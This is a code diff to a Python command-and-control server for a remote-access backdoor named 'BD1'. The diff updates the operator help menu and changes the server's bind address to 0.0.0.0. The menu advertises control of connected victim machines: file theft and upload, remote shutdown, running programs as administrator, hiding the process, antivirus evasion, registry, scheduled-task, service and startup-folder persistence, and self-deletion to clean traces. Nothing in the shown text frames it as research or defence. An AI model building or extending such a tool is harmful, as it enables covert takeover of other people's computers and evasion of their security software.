@@ -251,29 +251,34 @@ class Allclients:
         help_text = """
 Available Commands:
   General:
-    help                     - Show this help message (OK)
-    list                     - List all connected clients (OK)
-    select <client_id>       - Select a client to control (OK)
-    exit                     - Exit the server (OK)
+    help                     - Show this help message (✔)
+    list                     - List all connected clients (✔)
+    select <client_id>       - Select a client to control (✔)
+    exit                     - Exit the server (✔)
 
   File Operations:
-    download <file>         - Download file from client (OK but still lose stable)
-    upload <file>           - Upload file to client (OK but still lose stable)
+    download <file>         - Download file from client (! but still lose stable)
+    upload <file>           - Upload file to client (! but still lose stable)
 
   System Control:
-    allclients            - Send command all clients (OK)
-    shutdown              - Shutdown client machine (OK)
-    reboot                - Reboot client machine (OK)
-    sysinfo               - Get system information (OK)
-    cd <path>             - Change working directory (OK but still lose stable)
+    allclients            - Send command all clients (✔)
+    shutdown              - Shutdown client machine (✔)
+    reboot                - Reboot client machine (✔)
+    sysinfo               - Get system information (✔)
+    cd <path>             - Change working directory (! but still lose stable)
 
   Evade & Hide:
-    runas <program> [args] - Run program as administrator (OK)
-    hide (Auto)            - Hide BD1 process (OK)
-    evade                  - Apply antivirus evasion techniques (In processing)
+    runas <program> [args]     - Run program as administrator (✔)
+    hideself (Auto)            - Hide BD1 process (✔)
+    evadeanti (Auto)           - Apply antivirus evasion techniques (✔)
 
-  BypassUAC Commands:
-    silentrun <program>  - Bypass UAC and run program without UAC prompt (In processing)
+  Persistence & Cleanup
+    persist all          - Add all persistence methods (✔)
+    persist registry     - Add registry persistence (✔)
+    persist task         - Add scheduled task persistence (✔)
+    persist service      - Add service persistence (✔)
+    persist startup      - Add startup folder persistence (✔)
+    selfdelete           - Remove BD and clean traces (✔)
 
 """
         print(help_text)
@@ -339,5 +344,5 @@ Available Commands:
         print("\n[+] Server shutdown completed")
 
 if __name__ == "__main__":
-    server = Allclients("192.168.1.101", 5555)
+    server = Allclients("0.0.0.0", 5555)
     server.run_cmd()
